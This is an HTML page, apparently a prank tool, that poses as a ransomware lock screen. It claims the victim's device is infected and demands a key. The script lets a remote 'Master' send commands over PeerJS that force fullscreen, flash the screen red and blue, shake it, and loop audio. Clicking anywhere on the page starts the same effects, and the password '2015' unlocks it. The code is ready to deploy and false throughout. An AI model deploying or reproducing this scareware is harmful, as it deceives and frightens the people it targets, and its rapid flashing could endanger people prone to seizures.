<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM CRITICAL ERROR</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: black; color: white; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
        .shake { animation: shake-animation 0.1s infinite; }
        @keyframes shake-animation {
            0% { transform: translate(5px, 5px); background: red; }
            50% { transform: translate(-5px, -5px); background: blue; }
            100% { transform: translate(5px, 5px); }
        }
        #lock-box { border: 5px solid red; padding: 30px; background: rgba(0,0,0,0.9); z-index: 100; }
        h1 { color: red; font-size: 2.5em; text-shadow: 2px 2px white; }
        input { padding: 15px; width: 80%; text-align: center; font-size: 20px; background: #222; color: lime; border: 1px solid red; }
    </style>
</head>
<body id="b">

<div id="lock-box">
    <h1 id="msg">SYSTEM LOCKED!</h1>
    <p>YOUR DEVICE IS INFECTED. ENTER KEY (2015)</p>
    <input type="password" id="pw" placeholder="PASSWORD">
    <br><br>
    <button onclick="check()" style="padding:10px 20px; background:red; color:white; border:none; font-weight:bold;">DECRYPT</button>
</div>

<audio id="aud" loop>
    <source src="https://www.soundboard.com/handler/Downloadaudio.ashx?id=579626" type="audio/mpeg">
</audio>

<script>
    const b = document.getElementById('b');
    const aud = document.getElementById('aud');
    
    // NAMA BILIK KHAS (Tukar "bilik-jebakan-ali" ikut suka lu, asal sama dengan Master)
    const PEER_ID = "bilik-jebakan-ali-99"; 
    const peer = new Peer(PEER_ID); 

    // Bila Master "Call", mangsa terima arahan
    peer.on('connection', (conn) => {
        conn.on('data', (data) => {
            if(data === "ATTACK") startChaos();
            if(data === "RELEASE") release();
        });
    });

    function startChaos() {
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
        b.classList.add('shake');
        aud.play().catch(() => {});
        document.getElementById('msg').innerText = "SYSTEM OVERRIDE!!!";
    }

    function release() {
        b.classList.remove('shake');
        aud.pause();
        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
        document.getElementById('lock-box').innerHTML = "<h1 style='color:lime'>UNLOCKED</h1>";
    }

    function check() {
        if(document.getElementById('pw').value === "2015") release();
    }

    // Paksa Fullscreen & Bunyi bila skrin diklik pertama kali
    document.body.onclick = () => { startChaos(); };
</script>
</body>
</html>
